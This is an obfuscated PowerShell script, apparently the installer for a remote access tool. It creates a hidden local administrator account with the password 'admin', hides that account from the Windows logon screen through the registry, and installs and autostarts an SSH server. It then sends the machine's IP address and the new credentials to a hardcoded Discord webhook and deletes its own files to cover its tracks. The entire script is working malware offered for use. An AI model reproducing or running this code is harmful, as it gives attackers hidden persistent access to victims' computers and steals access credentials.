function RpLGWiUsIy {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

function geIwCZloBx {
    [CmdletBinding()]
    param (
        [string] $sqbXFdLvyw,
        [securestring] $CBFXIYeWPR
    )    
    begin {
    }    
    process {
        New-LocalUser "$sqbXFdLvyw" -Password $CBFXIYeWPR -FullName "$sqbXFdLvyw" -Description "Temporary local admin"
        Write-Verbose "$sqbXFdLvyw local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$sqbXFdLvyw"
        Write-Verbose "$sqbXFdLvyw added to the local administrator group"
    }    
    end {
    }
}

$location = pwd

# make admin
$sqbXFdLvyw = "admin" # Default username
$DCilJFugpP = "admin"
Remove-LocalUser -Name $sqbXFdLvyw
$HcMjDkGFes = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $HcMjDkGFes


# registry
# reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v admin
$csfMFzvgEN = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$jmQikqoKMZ = '00000000'
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
New-ItemProperty -Path $csfMFzvgEN -Name $sqbXFdLvyw -Value $jmQikqoKMZ -PropertyType DWORD -Force
# ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# rat file
$CRYnrkaDbe = "$env:UserName.rat"
$name = "$env:UserName"
$AhdjktGyiZ = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

New-Item -Path $CRYnrkaDbe -Force
Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ -Force # local ip addr
Add-Content -Path $CRYnrkaDbe -Value $sqbXFdLvyw -Force # username
Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP -Force # pass
Add-Content -Path $CRYnrkaDbe -Value $name -Force # name
Add-Content -Path $CRYnrkaDbe -Value $env:temp -Force # temp
Add-Content -Path $CRYnrkaDbe -Value $pwd -Force # startup
Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # remote host
Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # remote port
Add-Content -Path $CRYnrkaDbe -Value 'local' -Force # connection type

# send file to webhook
$link = "https://discord.com/api/webhooks/1182206285043728434/wNxaBaI78nxyhnhFcDgM1sSNnaYV0S0ECCjHGTHPCl4PMrbVUyiVoqlYfUNSTij5Bxrc"
Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"admin\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:username.rat```" $link"

#create payloads folder
Set-Location $env:temp 
mkdir happy
mkdir sad

# cleanup
attrib +h +s +r C:/Users/admin
Set-Location $location
Remove-Item $CRYnrkaDbe -Force
Remove-Item install.ps1 -Force


